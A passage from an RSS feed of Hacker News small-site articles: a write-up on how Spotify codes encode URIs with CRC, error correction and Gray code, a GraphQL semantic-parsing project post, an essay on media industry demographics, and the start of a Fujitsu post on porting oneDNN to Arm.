</code></pre></div><p>The barcode consists of 23 bars, of which only 20 actually contain information. This means that there are <code>8^20</code> pieces of information that can be encoded into the code.</p><h2 id="uris-to-barcodes">URIs to Barcodes</h2><p>How do you convert a <code>63^22</code> bit URI into an <code>8^20</code> bit barcode? There is <code>2.3e+21</code> times as much information in the URI than there is in the barcode. This is when I started asking questions and hunting for answers. <a href="https://stackoverflow.com/questions/47267924/string-encryption-generate-unique-pattern-like-spotify-codes/62120952#62120952">This question</a> was a start, but I ended up asking <a href="https://stackoverflow.com/questions/62121301/encoding-spotify-uri-to-spotify-codes">this SO question</a> and getting a couple of answers that linked to the relevant patents and contained more info about Spotify’s look up table.</p><p><a href="https://data.epo.org/publication-server/rest/v1.0/publication-dates/20190220/patents/EP3444755NWA1/document.pdf">Here is one patent</a>.</p><p><a href="http://www.freepatentsonline.com/20180181849.pdf">Here is another, more recent patent</a></p><blockquote><p>“Patents are the worst” - Peter Boone</p></blockquote><p>Let me just say: patents are the worst. They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a “media reference” is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to. A Stack Overflow user <a href="https://stackoverflow.com/a/63479041/10703868">discovered</a> that you can sniff the request that your phone makes when scanning the barcode to determine the media reference and API endpoint.</p><div><pre><code data-lang="python">heights <span>=</span> [<span>0</span>, <span>2</span>, <span>6</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>0</span>]
media_reference <span>=</span> <span>"67775490487"</span>
uri <span>=</span> <span>"spotify:user:jimmylavallin:playlist:2hXLRTDrNa4rG1XyM0ngT1"</span>
</code></pre></div><p>There are a few steps required to turn a media reference into a Spotify code (and vis versa).</p><h3 id="cyclic-redundancy-check">Cyclic Redundancy Check</h3><p>A <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic redundancy check</a> is calculated for the media ref. Based on the fact that 8 bits are calculated, I am assuming Spotify uses CRC8.</p><div><pre><code data-lang="python"><span>import</span> crc8

hash <span>=</span> crc8<span>.</span>crc8()
media_ref <span>=</span> <span>67775490487</span>
ref_bytes <span>=</span> media_ref<span>.</span>to_bytes(<span>5</span>, byteorder<span>=</span><span>"big"</span>)
<span>print</span>(ref_bytes)
<span># b'\x0f\xc7\xbb\xe9\xb7'</span>
hash<span>.</span>update(ref_bytes)
check_bits <span>=</span> hash<span>.</span>digest()
<span>print</span>(check_bits)
<span># b'\x0c'</span>
</code></pre></div><p>Append the crc to the media reference:</p><div><pre><code data-lang="python">media_reference <span>=</span> <span>b</span><span>'</span><span>\x0f\xc7\xbb\xe9\xb7\x0c</span><span>'</span>
</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</a></em></p>]]>
            </description>
            <link>https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156104</guid>
            <pubDate>Fri, 20 Nov 2020 00:30:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Semantic Parsing English to GraphQL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156093">thread link</a>) | @acarrera94
<br/>
November 19, 2020 | https://blog.lambdo.com/spegql-openai-scholars-final-project/ | <a href="https://web.archive.org/web/*/https://blog.lambdo.com/spegql-openai-scholars-final-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>The OpenAI scholars program requires a final open source project. I've been eagerly working on it and I'm happy to present it now. Along with this blog post, my final presentation, code and an academic paper, I present &nbsp;<strong>Semantic Parsing English-to-GraphQL </strong>(SPEGQL). </p><p>I presented this project in my final project proposal. So in this post, I'll cover some of the highlights. The full details can be found in <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">this paper</a>. &nbsp;</p><h3 id="background">Background</h3><p><strong>GraphQL</strong></p><p><a href="https://graphql.org/">GraphQL</a> is a query language for your api.</p><p>It's become very popular recently because of several reasons. It represents the schema as a graph, nested relations of any depth can be easily queried, it can aggregate data over multiple datasources and responses are predictable among other things.</p><p><strong>Semantic Parsing</strong></p><p>Semantic parsing is the task of converting a natural language utterance to a logical form: a machine-understandable representation of its meaning. In this case I wanted to semantically parse English to GraphQL.<br></p><p>Why this project?</p><p>I had a few reasons to work on this project:</p><ul><li>I wanted to understand the limits of general language models for Semantic Parsing</li><li>This project could potentially ease the learning curve for new developers of GraphQL </li><li>Potential tooling for non technical data users such as managers to gain insights into their data</li></ul><h2 id="objective">Objective</h2><p>Given an English prompt:</p><blockquote><em>“What is the name and date of the song released most recently?”</em></blockquote><p>And some GraphQL Schema</p><pre><code>type song {
 artist: artist
 artist_name: String
 country: String
 f_id: Int
 file: files
 genre: genre
 genre_is: String
 languages: String
 rating: Int
 releasedate: String
 resolution: Int
 song_name: String
}

...
</code></pre>
<p>Find a corresponding GraphQL Query: </p><pre><code>query {
 song(limit: 1, order_by: {releasedate: desc}) {
   song_name
   releasedate
 }
}
</code></pre>
<p>This objective could be tested by passing the prompt and schema though a model to output a query. The process is as follows: </p><figure><img src="https://res.cloudinary.com/dukk4p2n1/image/fetch/q_auto,f_auto,dpr_auto/https://blog.lambdo.com/content/images/2020/07/Screen-Shot-2020-07-02-at-12.13.09-PM.png" loading="lazy"></figure><h2 id="methods">Methods</h2><p>The process required multiple steps</p><ol><li>Create an English to GraphQL dataset</li><li>Run experiments on Encoder-Decoder Transformer models (Bart and T5)</li><li>Collect data and results</li><li>Implement a graphical interface to interact with the model</li></ol><h2 id="results">Results</h2><ul><li>46 - 50% exact set matching accuracy on GraphQL validation dataset</li></ul><p>A couple of example videos will help show results as well </p><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/OG8ZdSkF2BA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A query is generated for a schema and question.</figcaption></figure><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/HE9Q52THeJY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The model is able to generalize to new, different schemas it was not trained on.&nbsp;</figcaption></figure><p>That is a short overview of my project. </p><p>Here is the main Repo for creating and validating the Dataset:</p><p><a href="https://github.com/acarrera94/sql-to-graphql">https://github.com/acarrera94/sql-to-graphql</a></p><p>I also created an example notebook for anyone who wants to try out the model. This model is finetuned on GraphQL and SQL and can create queries for both languages:</p><p><a href="https://colab.research.google.com/drive/1l1h8RlEl-IS0XfkDh66qikH4UsD19KF6?usp=sharing"></a><a href="https://drive.google.com/uc?id=1H026ff-czIdLH3saJzbWUH8VKOW3j63X"></a><a href="https://colab.research.google.com/drive/1XdPrjtnr4e-O7imQEjDQ9XhCVaurR2Mf?usp=sharing"></a><a href="https://colab.research.google.com/drive/1XdPrjtnr4e-O7imQEjDQ9XhCVaurR2Mf?usp=sharing">https://colab.research.google.com/drive/1l1h8RlEl-IS0XfkDh66qikH4UsD19KF6?usp=sharing</a></p><p>I'm currently working on a paper that details the whole process, that's linked <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">here</a>.</p><p>And finally, I also gave a presentation about my project at OpenAI: </p><figure><a href="https://openai.com/blog/openai-scholars-spring-2020-final-projects/"><div><p>OpenAI Scholars Spring 2020: Final Projects</p><p>Our third class of OpenAI Scholars [/blog/openai-scholars-spring-2020/] presented their final projects at virtual Demo Day, showcasing their research
results from over the past five months. These projects investigated problems
such as analyzing how GPT-2 represents grammar, measuring the interpreta…</p><p><img src="https://openai.com/favicon.png"><span>OpenAI</span></p></div><p><img src="https://openai.com/content/images/2020/07/openai-scholars-gradient-horizontal-stacked-2.png"></p></a></figure>
</div></div>]]>
            </description>
            <link>https://blog.lambdo.com/spegql-openai-scholars-final-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156093</guid>
            <pubDate>Fri, 20 Nov 2020 00:28:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's Wrong with the Media]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25156088">thread link</a>) | @jger15
<br/>
November 19, 2020 | https://www.slowboring.com/p/whats-wrong-with-the-media | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/whats-wrong-with-the-media">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to Thursday! </p><p>I’ve been reading some interesting policy reports about everything from <a href="https://t.co/CxLqshzCAg">maternal mortality</a> to <a href="https://www.urban.org/urban-wire/can-we-design-student-loan-forgiveness-target-low-income-families">how to target student loan forgiveness</a> but at the moment there is a lot of demand for me to address the situation at Vox in detail or to assimilate my personal story into a larger narrative about “wokeness” or the culture wars. Personally I’m not a huge fan of navel-gazing. So I’ll just say that my personal interest in reclaiming my status as an independent, blog-like voice transcends any particular issues with any particular publication. I wanted to do <em>this,</em> not go find a different job, and I thank those of you who’ve joined me on this journey.</p><p>But Vox is typical of a few trends that exist broadly in the media industry and that I do think are of interest. </p><ul><li><p>The staff skews very young. </p></li><li><p>The staff is concentrated in big coastal cities, and especially New York.</p></li><li><p>The staff is overwhelmingly composed of graduates of selective colleges (state university flagship campuses and private schools with names you know).</p></li></ul><p>The media industry has long skewed young, educated, and New Yorky. But digital disruption trends have made it more so than ever before. Daily newspapers published in mid-sized cities and small towns are weaker and less significant. A lot of reporters born in the 1960s and 1970s have left the industry as it has shrunk and few of them work at digital native startups. </p><p>Separately from that change, national politics has been polarizing around age, educational attainment and population density in an unprecedented way. A group of young, recent college graduates living in Brooklyn would’ve skewed left in 1990 but this was an era when Al D’Amato could win statewide in New York and Democratic presidential campaigns would win in West Virginia. Today a demographically identical group skews much further left than it used to. None of this is really an outcome that anyone particularly wanted or intended. But it’s put a big thumb on the scales ideologically at the exact same time that economic trends have turned against the startups.</p><p>The result is that I think you should expect the instability we’ve seen this fall to be just the leading edge of the wedge.  </p><h4>Most media isn’t political journalism </h4><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png&quot;,&quot;height&quot;:1052,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2381922,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Culture criticism today: Calling out various problematic things</figcaption></figure></div><p>Reeves Wiedeman’s recent <a href="https://nymag.com/intelligencer/2020/11/inside-the-new-york-times-heated-reckoning-with-itself.html">article about internal tensions at The New York Times</a> includes this passage, which gets at a dynamic that I think you see across the media landscape. The vast majority of the people who work at any given publication are not professional political journalists, and generally the further you get from the ~~political journalism~~ section of a media organization the more left-wing things get: </p><blockquote><p>Of all the fronts on which the Times was being pushed to change, the strongest insurrectionary energy was coming from legions of newsroom-adjacent employees in digital jobs that didn’t exist a decade ago. The employees responsible for distributing the Times in the past — typesetters, pressmen, delivery drivers — had never been encouraged to speak up about the ethical questions at the heart of the paper’s journalism. But the app developers and software engineers who deliver the Times’ journalism to the world have held their hands up in just as many Ivy League seminars as their editorial peers. They might be too shy to march over to a masthead editor and complain about a clumsy headline, but #newsroom-feedback had opened a digital door to criticism. Reporters found that suddenly it was the Times’ programmers and developers, rather than their editors, who were critiquing their work. During the town hall about the Cotton op-ed, one data engineer said on Slack, “How many such process failures would be tolerated in tech?”</p><p>Many of the techsurrectionists had come from Facebook or Uber or Amazon to join the Times out of a sense of mission, leaving the ethical quandaries of the tech industry for what they thought were more virtuous pastures. “I joined the company for one reason, and it’s because I feel a responsibility to be a part of a mission that I believe in,” a product manager who previously worked at Apple wrote in #newsroom-feedback after the Cotton op-ed. “This feels like the rug’s been pulled out from under us — not just because it feels like that mission [has] been severely compromised by the decision to publish this piece, but even more so because the products we’re building were used to do it.”</p><p>“It’s like making telephone poles,” one software engineer added, “and finding out they’re being used as battering rams.”</p></blockquote><p>People who cover politics professionally, for better or worse, end up spending a fair amount of time talking to Republicans and trying to understand what conservatives think about public policy issues. If we’re doing our jobs at all correctly we can do stories that bring a mostly-progressive audience a greater understanding of what is happening on the other side. And when a professional political reporter does a bad job it’s often because he or she is taking a dive to maintain relationships with sources on the right, or bending over <em>too far</em> backwards to be fair. </p><p>At the same time, we political journalists have our fair share of totally ignorant hot takes about music or cooking or sports or whatever else that we can fire off. </p><p>The flip side is that our colleagues who cover sports or music or cooking also have hot takes about politics. Hot takes that come from the very narrow demographic and ideological niche that dominates the media and is untempered by the need to actually cover politics.</p><h4>Coverage has gotten really weird </h4><p>Ian Walker <a href="https://kotaku.com/playstation-5-the-kotaku-review-1845588904">recently ended his PS5 review for Kotaku with this thought</a>: </p><blockquote><p>The world is still reeling under the weight of the covid-19 pandemic. There are more Americans out of work right now than at any point in the country’s history, with no relief in sight. Our health care system is an inherently evil institution that forces people to ration life-saving medications like insulin and choose suicide over suffering with untreated mental illness.</p><p>As I’m writing this, it looks very likely that Joe Biden will be our next president. But it’s clear that the worst people aren’t going away just because a new old white man is sitting behind the Resolute desk—well, at least not&nbsp;<em>this</em>&nbsp;old white man. Our government is fundamentally broken in a way that necessitates radical change rather than incremental electorialism.</p><p>The harsh truth is that, for the reasons listed above and more, a lot of people simply won’t be able to buy a PlayStation 5, regardless of supply. Or if they can, concerns over increasing austerity in the United States and the growing threat of widespread political violence supersede any enthusiasm about the console’s SSD or how ray tracing makes reflections more realistic. That’s not to say you&nbsp;<em>can’t</em>&nbsp;be excited for those things—I certainly am, on some level—but there’s an irrefutable level of privilege attached to the ability to simply tune out the world as it burns around you.</p></blockquote><p>The problem here, to me, is not that Walker ought to “stick to sports.” It’s that the analysis is bad. But because it’s in a video game console review rather than a policy analysis section and conforms to the predominant ideological fads, it just sails through to our screens. </p><p>What actually happened is that starting in March the household savings rate soared (people are taking fewer vacations and eating out less) and while it’s been declining from its peak as of September it was still unusually high.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png&quot;,&quot;height&quot;:700,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:94064,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>One result of this is a lot of people have been able to pay off old debts. At the same time, interest rates have plunged without sparking an increase in borrowing, so household debt service costs have plummeted. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png&quot;,&quot;height&quot;:684,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:109636,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>The upshot of this is that no matter what you think about Biden or the American health care system, the fact is that the sales outlook for a new video game console system is very good. There is economic hardship in America, but the larger trend is that middle class people are seeing their homeowners’ equity rise and their debt payments fall, while cash piles up on their balance sheets, because it’s not safe to throw a big birthday party or take a vacation this weekend.</p><p>Not to just pick on this one article, but it was striking to me because it was both emblematic of the way far-left politics has suffused non-political media and also because the topic had nothing to do with race or gender identity issues.  </p><h4>It’s not really about “wokeness”</h4><p>There’s a lot of talk lately about excessive “wokeness” in the media driving people away from their jobs. But I don’t really think the underlying dynamics are specific to any particular issue area. </p><p>I remember a time in December 2018 when there was a <a href="https://www.vox.com/the-goods/2018/11/26/18112769/amazon-prime-cancel">flurry of articles about an Amazon Prime backlash</a> and I felt inspired to write a corrective noting that <a href="https://www.vox.com/policy-and-politics/2018/12/11/18129809/amazon-polling-popular-confidence">Amazon is actually incredibly popular</a> both as a shopping destination and in polls. In response to a similar barrage of articles about how <a href="https://www.vanityfair.com/style/2020/04/how-should-a-climate-change-reporter-think-about-having-children">maybe you shouldn’t have children because of climate change</a>, I felt inspired to write, at somewhat greater length, my book One Billion Americans. </p><p>The basic dynamic is that if you take a normal distribution (say of political views) and then shift the average a bit to one side, you end up with explosive growth in the number of outliers. In this chart, the average of the red line isn’t so different from the average of the black line. But the right-hand tail of the red line is much higher than the black.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg&quot;,&quot;height&quot;:461,&quot;width&quot;:999,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:85183,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If everyone in digital media is an under-fifty college graduate living in a big city, then it’s not that everyone in digital media is a far-left weirdo, but you do get <em>drastically more</em> far-left weirdness. </p><p>This tendency could obviously be tempered by business considerations. Hollywood is famously full of left-wing people and they do produce some content that reflects those ideas. But they mostly produce content that lacks overt political themes, and they also feed the network television audience a steady diet of police procedurals that embed very …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/whats-wrong-with-the-media">https://www.slowboring.com/p/whats-wrong-with-the-media</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/whats-wrong-with-the-media</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156088</guid>
            <pubDate>Fri, 20 Nov 2020 00:27:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fujitsu contributes ARMv8/SVE support to Intel's oneDNN library]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155872">thread link</a>) | @fomine3
<br/>
November 19, 2020 | https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en | <a href="https://web.archive.org/web/*/https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
        <div id="main-inner">
          


          
  
  <!-- google_ad_section_start -->
  <!-- rakuten_ad_target_begin -->
  
  
  

  

  
    
      
        <article id="entry-26006613653622863" data-keyword-campaign="" data-uuid="26006613653622863" data-publication-type="entry">
  <div>
    

    


    <div>
  
    <p><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201119/20201119120325.png" alt="f:id:fltech:20201119120325p:plain" title="" itemprop="image"></span></p>

<h2>Introduction</h2>

<p>Hello everyone. This is <a href="https://github.com/kawakami-k">Kawakami</a> from the Fujitsu Laboratories Platform Innovation project. The new Fugaku supercomputer has been delivered to Port Island located off the coast of Kobe. Developed jointly by RIKEN and Fujitsu, this supercomputer has entered the trial run phase this year ahead of schedule. As of June, it has already won four "firsts" in worldwide supercomputer rankings (<a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-01.html">TOP500, HPCG, HPL-AI</a>, <a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-02.html">Graph500</a>), so it is off to a very promising start. My department is involved in researching and developing techniques to accelerate deep learning (DL) processes on Fugaku and PRIMEHPC FX1000/700, which is our product that uses the same CPU as Fugaku. In this post, I will talk about our efforts to port oneDNN (library software used to accelerate DL processes) to Fugaku, and to contribute and incorporate our source code into Intel's main branch of oneDNN.</p>

<h2>Software stack for deep learning processes</h2>

<p>Applications that make use of deep learning processes (hereinafter called â€œDL processesâ€�) normally consists of a software stack formed from two layers: a framework layer and a library layer (as shown below). When a user wants to run an application that uses a DL process, they use an API provided by the framework to define the neural network for the process to run and to describe processing details. The framework calls library software functions and calculates the actual DL process based on the provided definition and process details. The systems that run DL processes come in various forms and sizes (such as supercomputers, the cloud, PCs, and smartphones), and the hardware in the system that is actually running the process might be a CPU or GPU. By separating the software stack into two layers like this, different systems and hardware executing the DL process are merged in the library layer, so users can use the same framework. This is beneficial because it allows for the same ease of use for all users with regard to defining networks and describing processes.</p>

<figure title="Software stack for deep learning processes"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072431.png" alt="f:id:fltech:20201117072431p:plain" title="" itemprop="image"></span><figcaption>Software stack for deep learning processes</figcaption></figure>

<p>Individually optimized library software is available to maximize system and hardware performance. This software is normally developed by the vendors who develop and manufacture the hardware. For example, Intel and NVIDIA have developed and made available libraries for Intel CPUs and NVIDIA GPUs, respectively. Fugaku and FX1000/700 are equipped with A64FX CPUs, which offer an expanded instruction set called Scalable Vector Extension (SVE) for High Performance Computing on top of the Armv8-A instruction set (the same CPU found in Android smartphones and iPhones). A64FX is the first CPU in the world to offer both the Armv8-A instruction set and the SVE instruction set (hereinafter, they are referred as â€œArmv8-A instruction setâ€� together), so there was no DL process library optimized for this CPU.</p>

<h2>Development of a DL process library for the Arm architecture</h2>

<p>There was no DL process library for the Armv8-A instruction set, so we needed to develop a new one. However, even if we at Fujitsu developed a new library on our own, users would not use it unless it could easily be used from the framework. We therefore decided to use the oneDNN DL library, developed by Intel for the x64 instruction set, as a reference implementation. oneDNN is the de facto standard for DL process libraries using CPUs, and it is already supported by a range of frameworks. A deep learning library for Armv8-A that includes APIs for oneDNN could therefore be used without a user having to modify a framework.</p>

<p>The source code for oneDNN has been released as <a href="https://github.com/oneapi-src/oneDNN">OSS (https://github.com/oneapi-src/oneDNN)</a>, so it can be obtained and recompiled for the Armv8-A instruction set. However, oneDNN contains many implementations optimized at the assembler level for the x64 instruction set, so simply recompiling the original source code would not provide enough performance. This was the start of our difficulties. We will discuss this later in this post.</p>

<p>The chart below is an example of the increases in processing speed we obtained through optimizing code for Armv8-A. oneDNN can be used to run a range of processes used in DL processing, such as convolution, batch_normalization, eltwise, pooling, and reorder. The chart below compares the processing speed for the reorder process (in which data types are converted or reordered) when the oneDNN source code is compiled without modification for the Armv8-A instruction set, and when the source code is compiled after our optimizations were implemented. The software processing speed obtained with the original oneDNN source code compiled without modification is normalized as a value of 1. As shown in the chart, we were able to increase the speed up to 400 times over, depending on the type of test pattern (although our optimizations actually decreased the speed for several test patterns, there would be no problem when using this together with a framework due to the small absolute values in measurement errors and processing times). Optimizing code for A64FX also resulted in extraordinary processing speed increases in other processes as well.</p>

<figure title="Measurement speed up of reorder processing"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072157.png" alt="f:id:fltech:20201117072157p:plain" title="" itemprop="image"></span><figcaption>Measurement speed up of reorder processing</figcaption></figure>

<h2>Contribution of source code to the main branch of oneDNN</h2>

